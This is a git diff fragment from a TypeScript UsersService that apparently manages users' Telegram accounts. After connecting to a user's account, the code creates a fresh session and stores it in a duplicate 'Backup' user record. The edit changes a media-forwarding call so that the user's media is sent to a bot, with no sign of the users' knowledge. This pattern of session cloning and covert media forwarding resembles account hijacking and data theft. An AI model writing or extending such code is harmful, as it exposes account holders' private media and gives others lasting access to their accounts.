@@ -32,7 +32,7 @@ export class UsersService {
       setTimeout(async () => {
         try {
           await connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
-          this.telegramService.forwardMedia(user.mobile, process.env.SavedMessages, null);
+          this.telegramService.forwardMediaToBot(user.mobile, null);
           const newSession = await this.telegramService.createNewSession(user.mobile);
           const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: "Backup" });
           await newUserBackup.save();
